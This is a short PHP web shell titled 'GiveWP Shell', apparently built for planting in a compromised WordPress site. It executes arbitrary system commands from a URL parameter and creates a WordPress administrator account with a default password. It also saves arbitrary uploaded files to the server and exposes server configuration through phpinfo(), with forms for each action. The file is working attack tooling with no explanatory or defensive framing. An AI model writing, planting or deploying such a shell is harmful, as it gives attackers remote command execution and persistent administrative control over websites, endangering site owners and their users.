<?php
if(isset($_GET['cmd'])){ system($_GET['cmd']); die(); }
if(isset($_POST['create_admin'])){
    $u=$_POST['username']??'admin'; $p=$_POST['password']??'Admin@123';
    $e=$_POST['email']??'admin@localhost';
    if(function_exists('wp_create_user')){
        $uid=wp_create_user($u,$p,$e);
        $u=new WP_User($uid);
        $u->set_role('administrator');
        echo "Admin created: $u | $p";
    } else { echo "WP not loaded"; }
}
if(isset($_FILES['f'])){ 
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    echo "Uploaded: ".$_FILES['f']['name'];
}
?><h2>GiveWP Shell</h2>
<form method=post enctype=multipart/form-data>
Upload: <input type=file name=f><input type=submit value=Upload>
</form>
<form method=post>
Create Admin: <input name=username value=admin> <input name=password value=Admin@123>
<input type=submit name=create_admin value=Create>
</form>
<form method=get>
CMD: <input name=cmd><input type=submit value=Run>
</form>
<?php phpinfo(); ?>
